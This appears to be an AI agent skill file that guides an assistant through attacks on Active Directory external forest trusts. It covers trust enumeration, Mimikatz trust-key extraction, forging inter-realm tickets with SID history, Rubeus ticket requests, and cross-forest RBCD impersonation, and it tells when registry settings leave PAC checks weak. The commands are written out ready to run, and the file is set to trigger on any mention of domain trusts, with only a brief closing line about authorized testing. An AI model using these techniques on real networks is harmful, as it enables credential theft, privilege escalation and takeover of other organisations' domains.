---
name: ad-external-forest-trust
description: Active Directory external forest trust exploitation methodology. Use this skill whenever the user mentions forest trusts, cross-domain access, AD trust enumeration, SID history abuse, RBCD across forests, inter-realm TGT/TGS, or any scenario involving multiple Active Directory domains with trust relationships. Trigger for trust-based lateral movement, cross-forest privilege escalation, or when analyzing trust configurations for security assessments.
---

# Active Directory External Forest Trust Exploitation

This skill guides you through exploiting external forest domain trusts in Active Directory environments. When a domain trusts another (inbound, outbound, or bidirectional), you can leverage that relationship for lateral movement and privilege escalation.

## When to Use This Skill

Use this methodology when:
- You have access to one domain and need to pivot to a trusted external domain
- You've identified a forest trust relationship during enumeration
- You're assessing cross-domain trust security
- You need to exploit SID History, RBCD, or other trust-based attack vectors
- You're performing red team operations across multiple AD forests

## Phase 1: Trust Enumeration

Before attempting exploitation, thoroughly enumerate the trust relationship to understand what you're working with.

### Enumerate Trust Relationships

```powershell
# Get all domain trusts from current domain
Get-DomainTrust

# Get detailed trust properties (requires AD RSAT/AD module)
Get-ADTrust -Identity <target-domain> -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```

**Key trust attributes to check:**
- `TrustDirection`: Inbound (they trust you), Outbound (you trust them), or Bidirectional
- `SelectiveAuthentication`: If disabled, cross-forest abuse is easier
- `SIDFiltering*`: If disabled, SID History attacks are viable
- `TGTDelegation`: Indicates delegation capabilities

### Enumerate the Target Domain

```powershell
# Get domain controllers in the external domain
Get-DomainComputer -Domain <external-domain> -Properties DNSHostName

# Find foreign groups (groups containing users from outside the domain)
Get-DomainForeignGroupMember -Domain <external-domain>

# Convert SID to readable name
ConvertFrom-SID <SID>

# Get members of cross-domain groups
Get-DomainGroupMember -Identity <group-name>

# Check local group membership on target DC
Get-NetLocalGroupMember -ComputerName <dc-hostname>
```

### Why This Matters

Understanding the trust configuration tells you which attack paths are viable:
- **Inbound trust**: The external domain trusts yours - you can authenticate to them
- **SelectiveAuthentication disabled**: Your credentials work across the trust without extra validation
- **SID filtering disabled**: You can inject SIDs into tokens for privilege escalation
- **Foreign Security Principals (FSP)**: These represent cross-domain group memberships that grant access

## Phase 2: Initial Access

If enumeration reveals cross-domain group memberships, use those credentials to access the external domain.

### Direct Access with Cross-Domain Credentials

```powershell
# If you have a user with cross-domain access
Enter-PSSession -ComputerName <dc.external-domain.local> -Credential <domain>\<username>

# Or use RunAs with the cross-domain account
runas /user:<external-domain>\<username> powershell
```

### Enumerate External Domain Users

```powershell
# Find users with SPNs in the external domain (for Kerberoasting)
Get-DomainUser -SPN -Domain <external-domain> | select SamAccountName

# List all users in the external domain
Get-DomainUser -Domain <external-domain>
```

## Phase 3: Impersonation Techniques

### Technique 1: SID History Abuse

**When it works**: User migrated between forests AND SID filtering is disabled.

**How it works**: When a user is migrated from one forest to another, their original SID is preserved in the SID History attribute. If SID filtering is disabled, you can forge a TGT with arbitrary SIDs added to the token.

**Prerequisites**:
- Access to the trust key (from the trusting domain's DC)
- SID filtering must be disabled
- User must be able to authenticate across the trust

**Execution**:

```powershell
# Step 1: Extract the trust signing key from the DC
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc.domain.local>

# Step 2: Forge a TGT with the target user's SID added to history
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current-domain> /SID:<current-domain-SID> /rc4:<trusted-key> /target:<external-domain> /ticket:C:\path\ticket.kirbi"'

# Step 3: Use the inter-realm TGT to request a TGS for the target service
Rubeus.exe asktgs /service:cifs/<dc.external-domain> /domain:<external-domain> /dc:<dc.external-domain> /ticket:C:\path\ticket.kirbi /nowrap

# Step 4: Access the target resource with the TGS
# The TGS grants you access as if you were the privileged user
```

### Technique 2: Full Cross-Domain Impersonation

**When it works**: You have credentials for a user with cross-domain permissions.

**How it works**: Request a TGT for the user in your domain, then use it to get an inter-realm TGT for the target domain, then request a TGS for the target service.

**Execution**:

```powershell
# Step 1: Get TGT for the cross-domain user in your domain
Rubeus.exe asktgt /user:<crossuser> /domain:<your-domain> /aes256:<password-hash> /opsec /nowrap

# Step 2: Get inter-realm TGT for the target domain
Rubeus.exe asktgs /service:krbtgt/<external-domain> /domain:<your-domain> /dc:<dc.your-domain> /ticket:<base64-ticket> /nowrap

# Step 3: Request TGS for the target service in external domain
Rubeus.exe asktgs /service:cifs/<dc.external-domain> /domain:<external-domain> /dc:<dc.external-domain> /ticket:<interrealm-ticket> /nowrap

# Step 4: Use the TGS to access the target resource
```

### Technique 3: Cross-Forest RBCD

**When it works**: You control a machine account in the trusting forest AND SelectiveAuthentication is disabled.

**How it works**: Resource-Based Constrained Delegation allows you to configure a target host to accept delegation from your controlled machine account. Combined with S4U (Service for User), you can impersonate any user on that host.

**Prerequisites**:
- Machine account you control in the trusting forest
- Ability to write `msDS-AllowedToActOnBehalfOfOtherIdentity` on target hosts
- SelectiveAuthentication must be disabled
- SID filtering must not strip your controlling SID

**Execution**:

```powershell
# Step 1: Create or compromise a machine account you control
# (e.g., MYLAB$ in the trusting forest)

# Step 2: Configure RBCD on the target host
# Using AD module:
Set-ADComputer -Identity <victim-host>$ -PrincipalsAllowedToDelegateToAccount <your-machine-account>$

# Or using PowerView:
Set-DomainObject <victim-host>$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_your_machine}

# Step 3: Use S4U to impersonate any user
Rubeus.exe s4u /ticket:<interrealm_tgt.kirbi> /impersonate:<EXTERNAL>\<target-user> /target:<victim-host.domain.external> /protocol:rpc
```

**Why this is powerful**: This bypasses the need for SID History forging and works even when you don't have the trust key. It's often missed in trust security reviews.

## Phase 4: PAC Validation Considerations

Microsoft has released patches (CVE-2024-26248, CVE-2024-29056) that enforce PAC signature validation on inter-forest tickets.

### Compatibility Mode (Unpatched DCs)
- Forged inter-realm PAC/SIDHistory/S4U paths still work
- Most common in older environments
- Exploitation techniques above work as documented

### Enforcement Mode (Patched DCs)
- Unsigned or tampered PAC data crossing forest trusts is rejected
- You must hold the target forest trust key to forge valid tickets
- Registry overrides can weaken this:
  - `PacSignatureValidationLevel`
  - `CrossDomainFilteringLevel`

### Check PAC Validation Status

```powershell
# Check registry settings on DC
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name PacSignatureValidationLevel

# Value 0 = Compatibility mode (forgery possible)
# Value 1 = Enforcement mode (forgery blocked)
```

## Common Attack Scenarios

### Scenario 1: Inbound Trust with Admin Group Membership

**Situation**: External domain has an inbound trust to your domain, and your user is in a group that's a member of Administrators on their DC.

**Approach**:
1. Enumerate the trust and confirm inbound direction
2. Find your user's cross-domain group membership
3. Use direct access with your credentials
4. If blocked, try SID History abuse

### Scenario 2: Bidirectional Trust with SID Filtering Disabled

**Situation**: Both domains trust each other, and SID filtering is disabled.

**Approach**:
1. Extract trust key from either DC
2. Forge TGT with elevated SIDs in history
3. Request TGS for target services
4. Access resources with elevated privileges

### Scenario 3: RBCD on Target Host

**Situation**: You control a machine account and can write to target hosts.

**Approach**:
1. Configure RBCD on target host for your machine account
2. Use inter-forest TGT to perform S4U
3. Impersonate any user on the target
4. Access resources as the impersonated user

## Tools Required

- **PowerView/PowerSploit**: Trust and domain enumeration
- **Mimikatz**: Trust key extraction, TGT forging
- **Rubeus**: Kerberos operations (asktgt, asktgs, s4u)
- **AD RSAT/AD Module**: Detailed trust property enumeration

## Safety Notes

- Always verify trust direction before attempting attacks
- Check PAC validation mode before attempting forgery
- Document all trust relationships for reporting
- Some techniques require specific prerequisites (disabled SID filtering, etc.)
- Test in authorized environments only

## References

- [Microsoft KB5037754 – PAC validation changes](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
- [HackTricks AD Methodology](https://book.hacktricks.xyz/windows/active-directory-methodology/external-forest-domain-oneway-inbound)
